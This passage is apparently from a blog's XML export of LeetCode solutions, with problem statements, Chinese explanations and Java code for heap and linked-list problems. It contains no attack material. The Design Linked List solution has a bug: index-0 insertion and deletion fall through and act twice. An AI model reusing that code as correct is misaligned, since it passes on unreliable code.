userFollowers.get(followerId).remove(followeeId);</span><br><span class="line">	        &#125;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Heap</tag>
      </tags>
  </entry>
  <entry>
    <title>703. Kth Largest Element in a Stream</title>
    <url>/2020/03/25/LeetCode/leetcode-000703.%20Kth%20Largest%20Element%20in%20a%20Stream/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>Design a class to find the <strong>k</strong>th largest element in a stream. Note that it is the kth largest element in the sorted order, not the kth distinct element.</p>
<p>Your <code>KthLargest</code> class will have a constructor which accepts an integer <code>k</code> and an integer array <code>nums</code>, which contains initial elements from the stream. For each call to the method <code>KthLargest.add</code>, return the element representing the kth largest element in the stream.</p>
<h2 id="Example-1"><a href="#Example-1" class="headerlink" title="Example 1:"></a>Example 1:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int k &#x3D; 3;</span><br><span class="line">int[] arr &#x3D; [4,5,8,2];</span><br><span class="line">KthLargest kthLargest &#x3D; new KthLargest(3, arr);</span><br><span class="line">kthLargest.add(3);   &#x2F;&#x2F; returns 4</span><br><span class="line">kthLargest.add(5);   &#x2F;&#x2F; returns 5</span><br><span class="line">kthLargest.add(10);  &#x2F;&#x2F; returns 5</span><br><span class="line">kthLargest.add(9);   &#x2F;&#x2F; returns 8</span><br><span class="line">kthLargest.add(4);   &#x2F;&#x2F; returns 8</span><br></pre></td></tr></table></figure>

<h2 id="Note："><a href="#Note：" class="headerlink" title="Note："></a>Note：</h2><ul>
<li>You may assume that <code>nums</code>‘ length ≥ <code>k-1</code> and <code>k</code> ≥ 1.</li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一：小顶堆"><a href="#解法一：小顶堆" class="headerlink" title="解法一：小顶堆"></a>解法一：小顶堆</h3><p>维护一个K个元素大小的小顶堆，那么堆顶元素就是第K个大小的了。</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">KthLargest</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> PriorityQueue&lt;Integer&gt; values;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">int</span> kth;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">KthLargest</span><span class="params">(<span class="keyword">int</span> k, <span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.kth = k;</span><br><span class="line">        values = <span class="keyword">new</span> PriorityQueue&lt;&gt;(k);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> num : nums) &#123;</span><br><span class="line">        	values.add(num);</span><br><span class="line">        	<span class="keyword">if</span> (values.size() &gt; kth) &#123;</span><br><span class="line">        		values.poll();</span><br><span class="line">        	&#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">        values.add(val);</span><br><span class="line">        <span class="keyword">if</span> (values.size() &gt; kth) &#123;</span><br><span class="line">        	values.poll();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> values.peek();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Heap</tag>
      </tags>
  </entry>
  <entry>
    <title>759. Employee Free Time</title>
    <url>/2020/03/25/LeetCode/leetcode-000759.%20Employee%20Free%20Time/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><ol>
<li><p>We are given a list <code>schedule</code> of employees, which represents the working time for each employee.</p>
<p> Each employee has a list of non-overlapping <code>Intervals</code>, and these intervals are in sorted order.</p>
<p> Return the list of finite intervals representing common, positive-length free time for <em>all</em> employees, also in sorted order.</p>
</li>
</ol>
<h2 id="Example-1"><a href="#Example-1" class="headerlink" title="Example 1:"></a>Example 1:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: schedule &#x3D; [[[1,2],[5,6]],[[1,3]],[[4,10]]]</span><br><span class="line">Output: [[3,4]]</span><br><span class="line">Explanation:</span><br><span class="line">There are a total of three employees, and all common</span><br><span class="line">free time intervals would be [-inf, 1], [3, 4], [10, inf].</span><br><span class="line">We discard any intervals that contain inf as they aren&#39;t finite.</span><br></pre></td></tr></table></figure>

<h2 id="Example-2："><a href="#Example-2：" class="headerlink" title="Example 2："></a>Example 2：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Input: schedule = [[[<span class="number">1</span>,<span class="number">3</span>],[<span class="number">6</span>,<span class="number">7</span>]],[[<span class="number">2</span>,<span class="number">4</span>]],[[<span class="number">2</span>,<span class="number">5</span>],[<span class="number">9</span>,<span class="number">12</span>]]]</span><br><span class="line">Output: [[<span class="number">5</span>,<span class="number">6</span>],[<span class="number">7</span>,<span class="number">9</span>]]</span><br><span class="line"></span><br><span class="line">(Even though we are representing Intervals in the form [x, y], the objects inside are Intervals, not lists or arrays. For example, schedule[<span class="number">0</span>][<span class="number">0</span>].start = <span class="number">1</span>, schedule[<span class="number">0</span>][<span class="number">0</span>].end = <span class="number">2</span>, and schedule[<span class="number">0</span>][<span class="number">0</span>][<span class="number">0</span>] is not defined.)</span><br><span class="line"></span><br><span class="line">Also, we wouldn<span class="string">'t include intervals like [5, 5] in our answer, as they have zero length.</span></span><br></pre></td></tr></table></figure>

<h2 id="Note"><a href="#Note" class="headerlink" title="Note:"></a>Note:</h2><ol>
<li><code>schedule</code> and <code>schedule[i]</code> are lists with lengths in range <code>[1, 50]</code>.</li>
<li><code>0 &lt;= schedule[i].start &lt; schedule[i].end &lt;= 10^8</code>.</li>
</ol>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>先把每个表头放在minHeap中. minHeap按照指向的Interval start排序.</p>
<p>poll出来的就是当前最小start的interval. 如果标记的时间比这个interval的start还小就说明出现了断裂也就是空余时间. </p>
<p>把标记时间增大到这个interval的end, 并且把这个interval所在链表的后一位加入minHeap中.</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Interval</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> start;</span><br><span class="line">		<span class="keyword">int</span> end;</span><br><span class="line"></span><br><span class="line">		Interval() &#123;</span><br><span class="line">			start = <span class="number">0</span>;</span><br><span class="line">			end = <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		Interval(<span class="keyword">int</span> s, <span class="keyword">int</span> e) &#123;</span><br><span class="line">			start = s;</span><br><span class="line">			end = e;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> List&lt;Interval&gt; <span class="title">employeeFreeTime</span><span class="params">(List&lt;List&lt;Interval&gt;&gt; schedule)</span> </span>&#123;</span><br><span class="line">		List&lt;Interval&gt; res = <span class="keyword">new</span> ArrayList&lt;Interval&gt;();</span><br><span class="line">		PriorityQueue&lt;Node&gt; minHeap = <span class="keyword">new</span> PriorityQueue&lt;Node&gt;(</span><br><span class="line">				(a, b) -&gt; schedule.get(a.employee).get(a.index).start - schedule.get(b.employee).get(b.index).start);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">int</span> start = Integer.MAX_VALUE;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; schedule.size(); i++) &#123;</span><br><span class="line">			minHeap.add(<span class="keyword">new</span> Node(i, <span class="number">0</span>));</span><br><span class="line">			start = Math.min(start, schedule.get(i).get(<span class="number">0</span>).start);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">while</span> (!minHeap.isEmpty()) &#123;</span><br><span class="line">			Node cur = minHeap.poll();</span><br><span class="line">			<span class="keyword">if</span> (start &lt; schedule.get(cur.employee).get(cur.index).start) &#123;</span><br><span class="line">				res.add(<span class="keyword">new</span> Interval(start, schedule.get(cur.employee).get(cur.index).start));</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			start = Math.max(start, schedule.get(cur.employee).get(cur.index).end);</span><br><span class="line">			cur.index++;</span><br><span class="line">			<span class="keyword">if</span> (cur.index &lt; schedule.get(cur.employee).size()) &#123;</span><br><span class="line">				minHeap.add(cur);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> res;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Node</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> employee;</span><br><span class="line">		<span class="keyword">int</span> index;</span><br><span class="line"></span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="title">Node</span><span class="params">(<span class="keyword">int</span> employee, <span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">			<span class="keyword">this</span>.employee = employee;</span><br><span class="line">			<span class="keyword">this</span>.index = index;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Heap</tag>
      </tags>
  </entry>
  <entry>
    <title>707. Design Linked List</title>
    <url>/2020/03/25/LeetCode/leetcode-000707-Design%20Linked%20List/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>Design your implementation of the linked list. You can choose to use the singly linked list or the doubly linked list. A node in a singly linked list should have two attributes: <code>val</code> and <code>next</code>. <code>val</code> is the value of the current node, and <code>next</code> is a pointer/reference to the next node. If you want to use the doubly linked list, you will need one more attribute <code>prev</code> to indicate the previous node in the linked list. Assume all nodes in the linked list are 0-indexed.</p>
<p>Implement these functions in your linked list class:</p>
<ul>
<li><code>get(index)</code> : Get the value of the <code>index</code>-th node in the linked list. If the index is invalid, return <code>-1</code>.</li>
<li><code>addAtHead(val)</code> : Add a node of value <code>val</code> before the first element of the linked list. After the insertion, the new node will be the first node of the linked list.</li>
<li><code>addAtTail(val)</code> : Append a node of value <code>val</code> to the last element of the linked list.</li>
<li><code>addAtIndex(index, val)</code> : Add a node of value <code>val</code> before the <code>index</code>-th node in the linked list. If <code>index</code> equals to the length of linked list, the node will be appended to the end of linked list. If index is greater than the length, the node will not be inserted.</li>
<li><code>deleteAtIndex(index)</code> : Delete the <code>index</code>-th node in the linked list, if the index is valid.</li>
</ul>
<h2 id="Example-1"><a href="#Example-1" class="headerlink" title="Example 1:"></a>Example 1:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: </span><br><span class="line">[&quot;MyLinkedList&quot;,&quot;addAtHead&quot;,&quot;addAtTail&quot;,&quot;addAtIndex&quot;,&quot;get&quot;,&quot;deleteAtIndex&quot;,&quot;get&quot;]</span><br><span class="line">[[],[1],[3],[1,2],[1],[1],[1]]</span><br><span class="line">Output:  </span><br><span class="line">[null,null,null,null,2,null,3]</span><br><span class="line"></span><br><span class="line">Explanation:</span><br><span class="line">MyLinkedList linkedList &#x3D; new MyLinkedList(); &#x2F;&#x2F; Initialize empty LinkedList</span><br><span class="line">linkedList.addAtHead(1);</span><br><span class="line">linkedList.addAtTail(3);</span><br><span class="line">linkedList.addAtIndex(1, 2);  &#x2F;&#x2F; linked list becomes 1-&gt;2-&gt;3</span><br><span class="line">linkedList.get(1);            &#x2F;&#x2F; returns 2</span><br><span class="line">linkedList.deleteAtIndex(1);  &#x2F;&#x2F; now the linked list is 1-&gt;3</span><br><span class="line">linkedList.get(1);            &#x2F;&#x2F; returns 3</span><br></pre></td></tr></table></figure>

<h2 id="Constraints"><a href="#Constraints" class="headerlink" title="Constraints:"></a>Constraints:</h2><ul>
<li><code>0 &lt;= index,val &lt;= 1000</code></li>
<li>Please do not use the built-in LinkedList library.</li>
<li>At most <code>2000</code> calls will be made to <code>get</code>, <code>addAtHead</code>, <code>addAtTail</code>, <code>addAtIndex</code> and <code>deleteAtIndex</code>.</li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyLinkedList</span> </span>&#123;</span><br><span class="line">		LinkNode head = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/** Initialize your data structure here. */</span></span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="title">MyLinkedList</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/**</span></span><br><span class="line"><span class="comment">		 * Get the value of the index-th node in the linked list. If the index</span></span><br><span class="line"><span class="comment">		 * is invalid, return -1.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">get</span><span class="params">(<span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">			LinkNode currentNode = head;</span><br><span class="line">			<span class="keyword">while</span> (index &gt; <span class="number">0</span> &amp;&amp; currentNode != <span class="keyword">null</span>) &#123;</span><br><span class="line">				currentNode = currentNode.next;</span><br><span class="line">				index--;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (currentNode == <span class="keyword">null</span>)</span><br><span class="line">				<span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">			<span class="keyword">return</span> currentNode.val;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/**</span></span><br><span class="line"><span class="comment">		 * Add a node of value val before the first element of the linked list.</span></span><br><span class="line"><span class="comment">		 * After the insertion, the new node will be the first node of the</span></span><br><span class="line"><span class="comment">		 * linked list.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addAtHead</span><span class="params">(<span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">			<span class="keyword">if</span> (head == <span class="keyword">null</span>) &#123;</span><br><span class="line">				head = <span class="keyword">new</span> LinkNode(val, <span class="keyword">null</span>);</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				LinkNode node = <span class="keyword">new</span> LinkNode(val, head);</span><br><span class="line">				head = node;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/**</span></span><br><span class="line"><span class="comment">		 * Append a node of value val to the last element of the linked list.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addAtTail</span><span class="params">(<span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">			<span class="keyword">if</span> (head == <span class="keyword">null</span>) &#123;</span><br><span class="line">				head = <span class="keyword">new</span> LinkNode(val, <span class="keyword">null</span>);</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				LinkNode currentNode = head;</span><br><span class="line">				<span class="keyword">while</span> (currentNode.next != <span class="keyword">null</span>)</span><br><span class="line">					currentNode = currentNode.next;</span><br><span class="line">				currentNode.next = <span class="keyword">new</span> LinkNode(val, <span class="keyword">null</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/**</span></span><br><span class="line"><span class="comment">		 * Add a node of value val before the index-th node in the linked list.</span></span><br><span class="line"><span class="comment">		 * If index equals to the length of linked list, the node will be</span></span><br><span class="line"><span class="comment">		 * appended to the end of linked list. If index is greater than the</span></span><br><span class="line"><span class="comment">		 * length, the node will not be inserted.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addAtIndex</span><span class="params">(<span class="keyword">int</span> index, <span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">			<span class="keyword">if</span> (index == <span class="number">0</span>)</span><br><span class="line">				addAtHead(val);</span><br><span class="line">			LinkNode currentNode = head;</span><br><span class="line">			<span class="keyword">while</span> (index &gt; <span class="number">1</span> &amp;&amp; currentNode != <span class="keyword">null</span>) &#123;</span><br><span class="line">				currentNode = currentNode.next;</span><br><span class="line">				index--;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (currentNode != <span class="keyword">null</span>)</span><br><span class="line">				currentNode.next = <span class="keyword">new</span> LinkNode(val, currentNode.next);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/**</span></span><br><span class="line"><span class="comment">		 * Delete the index-th node in the linked list, if the index is valid.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">deleteAtIndex</span><span class="params">(<span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">			<span class="keyword">if</span> (index == <span class="number">0</span> &amp;&amp; head != <span class="keyword">null</span>)</span><br><span class="line">				head = head.next;</span><br><span class="line">			LinkNode currentNode = head;</span><br><span class="line">			<span class="keyword">while</span> (index &gt; <span class="number">1</span> &amp;&amp; currentNode != <span class="keyword">null</span>) &#123;</span><br><span class="line">				currentNode = currentNode.next;</span><br><span class="line">				index--;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (currentNode != <span class="keyword">null</span> &amp;&amp; currentNode.next != <span class="keyword">null</span>)</span><br><span class="line">				currentNode.next = currentNode.next.next;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">LinkNode</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> val;</span><br><span class="line">		LinkNode next;</span><br><span class="line"></span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="title">LinkNode</span><span class="params">(<span class="keyword">int</span> val, LinkNode next)</span> </span>&#123;</span><br><span class="line">			<span class="keyword">this</span>.val = val;</span><br><span class="line">			<span class="keyword">this</span>.next = next;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>LinkedList</tag>
      </tags>
  </entry>
  <entry>
    <title>1290. Convert Binary Number in a Linked List to Integer</title>
    <url>/2020/03/25/LeetCode/leetcode-001290-Convert%20Binary%20Number%20in%20a%20Linked%20List%20to%20Integer/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>Given <code>head</code> which is a reference node to a singly-linked list. The value of each node in the linked list is either 0 or 1. The linked list holds the binary representation of a number.</p>
<p>Return the <em>decimal value</em> of the number in the linked list.</p>
<h2 id="Example-1"><a href="#Example-1" class="headerlink" title="Example 1:"></a>Example 1:</h2><p><img src="https://assets.leetcode.com/uploads/2019/12/05/graph-1.png" alt="img"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: head &#x3D; [1,0,1]</span><br><span class="line">Output: 5</span><br><span class="line">Explanation: (101) in base 2 &#x3D; (5) in base 10</span><br></pre></td></tr></table></figure>

<h2 id="Example-2"><a href="#Example-2" class="headerlink" title="Example 2:"></a>Example 2:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: head &#x3D; [0]</span><br><span class="line">Output: 0</span><br></pre></td></tr></table></figure>

<h2 id="Example-3"><a href="#Example-3" class="headerlink" title="Example 3:"></a>Example 3:</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Input: head = [<span class="number">1</span>]</span><br><span class="line">Output: <span class="number">1</span></span><br></pre></td></tr></table></figure>

<h2 id="Example-4"><a href="#Example-4" class="headerlink" title="Example 4:"></a>Example 4:</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Input: head = [<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">Output: <span class="number">18880</span></span><br></pre></td></tr></table></figure>

<h2 id="Example-5"><a href="#Example-5" class="headerlink" title="Example 5:"></a>Example 5:</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Input: head = [<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">Output: <span class="number">0</span></span><br></pre></td></tr></table></figure>

<h2 id="Constraints"><a href="#Constraints" class="headerlink" title="Constraints:"></a>Constraints:</h2><ul>
<li>The Linked List is not empty.</li>
<li>Number of nodes will not exceed <code>30</code>.</li>
<li>Each node’s value is either <code>0</code> or <code>1</code>.</li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>位运算</p>
<p>初始化value为head.val.每当链表向后取值一位，value的值就乘以2，接着加上head.next.val的值就行了</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getDecimalValue</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> value = head.val;</span><br><span class="line">		<span class="keyword">while</span> (<span class="keyword">null</span> != head.next) &#123;</span><br><span class="line">			head = head.next;</span><br><span class="line">			value = value &lt;&lt; <span class="number">1</span>;</span><br><span class="line">			value += head.val;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> value;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h4 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h4><p>用StringBuilder生成一个二进制字符串，然后用parseInt(value, radix)转成十进制</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getDecimalValue</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">		StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">		sb.append(head.val);</span><br><span class="line">		<span class="keyword">while</span> (<span class="keyword">null</span> != head.next) &#123;</span><br><span class="line">			head = head.next;</span><br><span class="line">			sb.append(head.val);</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">return</span> Integer.parseInt(sb.toString(), <span class="number">2</span>);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>LinkedList</tag>
      </tags>
  </entry>
  <entry>
    <title>973. K Closest Points to Origin</title>
    <url>/2020/03/25/LeetCode/leetcode-000973.K%20Closest%20Points%20to%20Origin/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>We have a list of <code>points</code> on the plane. Find the <code>K</code> closest points to the origin <code>(0, 0)</code>.</p>
<p>(Here, the distance between two points on a plane is the Euclidean distance.)</p>
<p>You may return the answer in any order. The answer is guaranteed to be unique (except for the order that it is in.)</p>
<h2 id="Example-1"><a href="#Example-1" class="headerlink" title="Example 1:"></a>Example 1:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: points &#x3D; [[1,3],[-2,2]], K &#x3D; 1</span><br><span class="line">Output: [[-2,2]]</span><br><span class="line">Explanation: </span><br><span class="line">The distance between (1, 3) and the origin is sqrt(10).</span><br><span class="line">The distance between (-2, 2) and the origin is sqrt(8).</span><br><span class="line">Since sqrt(8) &lt; sqrt(10), (-2, 2) is closer to the origin.</span><br><span class="line">We only want the closest K &#x3D; 1 points from the origin, so the answer is just [[-2,2]].</span><br></pre></td></tr></table></figure>

<h2 id="Example-2："><a href="#Example-2：" class="headerlink" title="Example 2："></a>Example 2：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Input: points = [[<span class="number">3</span>,<span class="number">3</span>],[<span class="number">5</span>,-<span class="number">1</span>],[-<span class="number">2</span>,<span class="number">4</span>]], K = <span class="number">2</span></span><br><span class="line">Output: [[<span class="number">3</span>,<span class="number">3</span>],[-<span class="number">2</span>,<span class="number">4</span>]]</span><br><span class="line">(The answer [[-<span class="number">2</span>,<span class="number">4</span>],[<span class="number">3</span>,<span class="number">3</span>]] would also be accepted.)</span><br></pre></td></tr></table></figure>

<h2 id="Note"><a href="#Note" class="headerlink" title="Note:"></a>Note:</h2><ol>
<li><code>1 &lt;= K &lt;= points.length &lt;= 10000</code></li>
<li><code>-10000 &lt; points[i][0] &lt; 10000</code></li>
<li><code>-10000 &lt; points[i][1] &lt; 10000</code></li>
</ol>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>构造一个小顶堆，取K个即可。</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Point</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> index;</span><br><span class="line">		<span class="keyword">double</span> distance;</span><br><span class="line">		</span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="title">Point</span><span class="params">(<span class="keyword">int</span> index, <span class="keyword">double</span> distance)</span> </span>&#123;</span><br><span class="line">			<span class="keyword">this</span>.index = index;</span><br><span class="line">			<span class="keyword">this</span>.distance = distance;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getIndex</span><span class="params">()</span> </span>&#123;</span><br><span class="line">			<span class="keyword">return</span> index;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setIndex</span><span class="params">(<span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">			<span class="keyword">this</span>.index = index;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">getDistance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">			<span class="keyword">return</span> distance;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setDistance</span><span class="params">(<span class="keyword">double</span> distance)</span> </span>&#123;</span><br><span class="line">			<span class="keyword">this</span>.distance = distance;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">int</span>[][] kClosest(<span class="keyword">int</span>[][] points, <span class="keyword">int</span> K) &#123;</span><br><span class="line">        PriorityQueue&lt;Point&gt; points2 = <span class="keyword">new</span> PriorityQueue&lt;Point&gt;(K, <span class="keyword">new</span> Comparator&lt;Point&gt;() &#123;</span><br><span class="line"></span><br><span class="line">			<span class="meta">@Override</span></span><br><span class="line">			<span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(Point o1, Point o2)</span> </span>&#123;</span><br><span class="line">				<span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">				<span class="keyword">if</span> (o1.getDistance() - o2.getDistance() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">					<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">				&#125; <span class="keyword">else</span> <span class="keyword">if</span> (o1.getDistance() - o2.getDistance() == <span class="number">0</span>)&#123;</span><br><span class="line">					<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; points.length;i++) &#123;</span><br><span class="line">        	Point point = <span class="keyword">new</span> Point(i, Math.sqrt(points[i][<span class="number">0</span>] * points[i][<span class="number">0</span>] + points[i][<span class="number">1</span>] * points[i][<span class="number">1</span>]));</span><br><span class="line">        	points2.add(point);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">int</span>[][] result = <span class="keyword">new</span> <span class="keyword">int</span>[K][<span 